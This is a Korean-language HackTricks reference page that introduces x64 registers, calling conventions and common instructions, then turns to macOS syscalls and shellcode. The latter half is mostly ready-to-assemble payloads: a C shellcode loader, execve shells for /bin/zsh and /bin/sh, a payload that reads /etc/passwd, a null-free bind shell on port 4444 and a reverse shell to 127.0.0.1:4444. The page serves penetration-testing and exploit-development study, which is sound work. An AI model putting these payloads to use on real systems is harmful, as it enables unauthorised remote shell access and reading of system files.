# x64 소개

{{#include ../../../banners/hacktricks-training.md}}

## **x64 소개**

x64는 x86-64라고도 하며, 주로 데스크톱 및 서버 컴퓨팅에서 사용되는 64비트 프로세서 아키텍처입니다. Intel이 제작한 x86 아키텍처에서 시작되었으며, 이후 AMD가 AMD64라는 이름으로 채택했습니다. 현재 개인용 컴퓨터와 서버에서 널리 사용되는 아키텍처입니다.

### **레지스터**

x64는 x86 아키텍처를 확장하여 `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, 그리고 `r8`부터 `r15`까지 명명된 **16개의 범용 레지스터**를 제공합니다. 각각 **64비트**(8바이트) 값을 저장할 수 있습니다. 또한 호환성 및 특정 작업을 위해 이러한 레지스터에는 32비트, 16비트, 8비트 하위 레지스터도 있습니다.

1. **`rax`** - 전통적으로 함수의 **반환 값**에 사용됩니다.
2. **`rbx`** - 메모리 작업에서 **base register**로 자주 사용됩니다.
3. **`rcx`** - 일반적으로 **loop counter**에 사용됩니다.
4. **`rdx`** - 확장 산술 연산을 포함한 다양한 역할에 사용됩니다.
5. **`rbp`** - stack frame의 **base pointer**입니다.
6. **`rsp`** - stack의 최상단을 추적하는 **stack pointer**입니다.
7. **`rsi`** 및 **`rdi`** - string/memory 작업에서 **source** 및 **destination** 인덱스에 사용됩니다.
8. **`r8`**부터 **`r15`**까지 - x64에서 도입된 추가 범용 레지스터입니다.

### **Calling Convention**

x64 calling convention은 운영 체제에 따라 다릅니다. 예를 들어 다음과 같습니다.

- **Windows**: 처음 **4개의 매개변수**는 **`rcx`**, **`rdx`**, **`r8`**, **`r9`** 레지스터로 전달됩니다. 이후 매개변수는 stack에 push됩니다. 반환 값은 **`rax`**에 저장됩니다.
- **System V (일반적으로 UNIX 계열 시스템에서 사용됨)**: 처음 **6개의 정수 또는 pointer 매개변수**는 **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, **`r9`** 레지스터로 전달됩니다. 반환 값 역시 **`rax`**에 저장됩니다.

함수에 6개보다 많은 입력이 있는 경우 **나머지는 stack으로 전달됩니다**. stack pointer인 **RSP**는 **16바이트 정렬** 상태여야 하며, 이는 call이 발생하기 전에 해당 pointer가 가리키는 주소를 16으로 나눌 수 있어야 한다는 의미입니다. 따라서 일반적으로 함수 call을 수행하기 전에 shellcode에서 RSP가 올바르게 정렬되도록 해야 합니다. 그러나 실제로는 이 요구 사항이 충족되지 않아도 system call이 동작하는 경우가 많습니다.

### Swift의 Calling Convention

Swift에는 자체 **calling convention**이 있으며, 다음에서 확인할 수 있습니다: [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **일반적인 명령어**

x64 명령어는 풍부한 집합을 제공하며, 이전 x86 명령어와의 호환성을 유지하는 동시에 새로운 명령어도 도입합니다.

- **`mov`**: 한 **레지스터** 또는 **메모리 위치**의 값을 다른 곳으로 **이동**합니다.
- 예시: `mov rax, rbx` — `rbx`의 값을 `rax`로 이동합니다.
- **`push`** 및 **`pop`**: 값을 **stack**에 push하거나 stack에서 pop합니다.
- 예시: `push rax` — `rax`의 값을 stack에 push합니다.
- 예시: `pop rax` — stack의 최상단 값을 stack에서 pop하여 `rax`에 저장합니다.
- **`add`** 및 **`sub`**: **덧셈** 및 **뺄셈** 연산입니다.
- 예시: `add rax, rcx` — `rax`와 `rcx`의 값을 더하고 그 결과를 `rax`에 저장합니다.
- **`mul`** 및 **`div`**: **곱셈** 및 **나눗셈** 연산입니다. 참고: 이 명령어는 피연산자 사용 방식과 관련된 특정 동작을 수행합니다.
- **`call`** 및 **`ret`**: **함수를 호출**하고 **함수에서 반환**할 때 사용됩니다.
- **`int`**: 소프트웨어 **interrupt**를 발생시키는 데 사용됩니다. 예를 들어 `int 0x80`은 32비트 x86 Linux에서 system call에 사용되었습니다.
- **`cmp`**: 두 값을 **비교**하고 그 결과에 따라 CPU의 flag를 설정합니다.
- 예시: `cmp rax, rdx` — `rax`와 `rdx`를 비교합니다.
- **`je`, `jne`, `jl`, `jge`, ...**: 이전 `cmp` 또는 test의 결과에 따라 control flow를 변경하는 **conditional jump** 명령어입니다.
- 예시: `cmp rax, rdx` 명령어 이후 `je label` — `rax`가 `rdx`와 같으면 `label`로 jump합니다.
- **`syscall`**: 일부 x64 시스템(예: 최신 Unix)에서 **system call**에 사용됩니다.
- **`sysenter`**: 일부 플랫폼에서 최적화된 **system call** 명령어입니다.

### **Function Prologue**

1. **이전 base pointer push**: `push rbp` (caller의 base pointer를 저장)
2. **현재 stack pointer를 base pointer로 이동**: `mov rbp, rsp` (현재 함수의 새로운 base pointer를 설정)
3. **local variable을 위한 stack 공간 할당**: `sub rsp, <size>` (`<size>`는 필요한 바이트 수)

### **Function Epilogue**

1. **현재 base pointer를 stack pointer로 이동**: `mov rsp, rbp` (local variable 할당 해제)
2. **stack에서 이전 base pointer pop**: `pop rbp` (caller의 base pointer 복원)
3. **Return**: `ret` (caller에게 control을 반환)

## macOS

### syscalls

syscall에는 여러 클래스가 있으며, [**여기에서 확인할 수 있습니다**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
그런 다음 각 syscall 번호를 [**이 URL에서**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:** 찾을 수 있습니다.
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
따라서 **Unix/BSD class**에서 `open` syscall (**5**)을 호출하려면 다음 값을 추가해야 합니다: `0x2000000`

따라서 open을 호출할 syscall number는 `0x2000005`입니다.

### Shellcodes

컴파일하려면:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
바이트를 추출하려면:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>shellcode 테스트용 C 코드</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**여기**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)에서 가져와 설명합니다.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### cat으로 읽기

목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`를 실행하는 것이므로, 두 번째 인수(x1)는 매개변수 배열입니다(메모리에서는 주소가 저장된 스택을 의미합니다).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### sh로 명령 실행
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)의 Bind shell은 **포트 4444**에서 동작합니다<sup>[[2]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)의 Reverse shell. **127.0.0.1:4444**로 Reverse shell<sup>[[3]](#references)</sup>
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## 참고문헌

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
